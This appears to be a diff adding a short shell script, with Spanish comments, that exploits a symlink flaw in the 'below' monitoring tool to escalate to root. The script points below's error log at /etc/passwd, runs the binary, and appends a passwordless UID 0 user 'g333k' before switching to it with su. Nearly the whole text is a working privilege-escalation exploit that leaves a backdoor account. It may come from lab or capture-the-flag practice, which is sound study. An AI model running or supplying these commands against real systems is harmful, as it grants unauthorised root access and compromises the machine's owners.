@@ -1,0 +1,15 @@
+# Backup por seguridad
+sudo cp /etc/passwd /etc/passwd.bak
+
+# Preparar symlink
+sudo rm -f /var/log/below/error_root.log
+sudo ln -s /etc/passwd /var/log/below/error_root.log
+
+# Ejecutar binario vulnerable
+sudo /usr/bin/below record
+
+# Insertar usuario con UID 0
+echo 'g333k::0:0:g333k:/root:/bin/bash' | sudo tee -a /var/log/below/error_root.log
+
+# Cambiar a shell root
+su g333k
